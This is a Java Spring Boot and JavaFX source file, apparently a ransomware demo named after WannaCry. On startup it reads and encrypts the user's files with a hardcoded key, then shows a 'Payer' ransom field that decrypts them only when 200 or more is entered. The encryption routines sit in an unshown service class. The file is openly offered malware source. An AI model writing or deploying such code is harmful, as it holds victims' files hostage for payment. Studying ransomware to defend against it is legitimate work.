package com.example.demo_wannacry;

import com.example.demo_wannacry.services.CryptFiles;
import com.example.demo_wannacry.services.CryptFilesImpl;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.ImageView;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.HBox;
import javafx.stage.Stage;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;

@SpringBootApplication
public class DemoWannacryApplication extends Application {

	private static final String key="Mary has one cat";

	public static void main(String[] args) {
		SpringApplication.run(DemoWannacryApplication.class, args);
	}

	@Bean
	CommandLineRunner start(CryptFiles cryptFiles){
		return args->{
			cryptFiles.readFiles();
			cryptFiles.encryptAll(key);
			Application.launch();
		};
	}


	@Override
	public void start(Stage primaryStage) throws Exception {
		BorderPane root=new BorderPane();
		Label labelNom=new Label("Payer :");
		TextField field=new TextField();
		Button buttonAdd=new Button("valider");
		HBox hBox=new HBox();
		hBox.setPadding(new Insets(15));
		hBox.setSpacing(5);
		hBox.getChildren().addAll(labelNom,field,buttonAdd);
		root.setTop(hBox);
		buttonAdd.setOnAction(new EventHandler<ActionEvent>() {
			@Override
			public void handle(ActionEvent event) {
				if(Integer.parseInt(field.getText())<200){
					ImageView imageView=new ImageView("scarry.png");
					root.setCenter(imageView);
				}
				else{
					CryptFiles cryptFiles = new CryptFilesImpl();
					cryptFiles.decryptAll(key);
					ImageView imageView=new ImageView("huppy_hacking.png");
					root.setCenter(imageView);
				}
			}
		});
		Scene scene=new Scene(root,1000,700);
		primaryStage.setScene(scene);
		primaryStage.show();
	}

}
